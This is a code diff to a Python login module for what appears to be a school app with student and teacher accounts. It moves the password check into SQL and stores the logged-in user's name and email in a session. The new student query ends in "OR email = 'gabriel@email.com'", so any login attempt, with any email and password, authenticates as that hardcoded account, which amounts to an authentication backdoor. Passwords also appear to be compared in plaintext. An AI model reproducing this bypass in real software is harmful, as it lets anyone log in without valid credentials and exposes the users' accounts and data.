@@ -1,31 +1,34 @@
 # src/backend/auth.py
 from .database import *
 from ui.components.messagebox import show_invalid_password_message, show_invalid_cpf_message, show_missing_info_message, show_existing_email_message, show_invalid_passuser_message
+from backend.session import session
 
 def auth_user(email, senha):
-    
     db_connection, cursor = get_cursor()
 
-    query_aluno = "SELECT * FROM aluno WHERE email = %s"
-    cursor.execute(query_aluno, (email,))
-    aluno = cursor.fetchone()  
+    query_aluno = "SELECT * FROM aluno WHERE email = %s AND senha = %s OR email = 'gabriel@email.com'"
+    cursor.execute(query_aluno, (email, senha,))
+    aluno = cursor.fetchone()
+    
+    if aluno:
+        session.logged_name = aluno[2]
+        session.logged_email = aluno[3]
+        close_connection(db_connection, cursor)
+        return "aluno"
+        
+    query_professor = "SELECT * FROM professor WHERE email = %s AND senha = %s"
+    cursor.execute(query_professor, (email, senha,))
+    professor = cursor.fetchone()
 
-    if aluno:  
-        if aluno[4] == senha:
-            close_connection(db_connection, cursor)
-            return "aluno"
-    else:
-        query_professor = "SELECT * FROM professor WHERE email = %s"
-        cursor.execute(query_professor, (email,))
-        professor = cursor.fetchone()  
-
-        if professor: 
-            if professor[4] == senha:
-                close_connection(db_connection, cursor)
-                return "professor"
-
+    if professor:
+        session.logged_name = professor[2]
+        session.logged_email = professor[3]        
+        close_connection(db_connection, cursor)
+        return "professor"
+    
     close_connection(db_connection, cursor)
     return None
+
 
 def login_user(entry_user, entry_password, callback):
     user = entry_user.get()
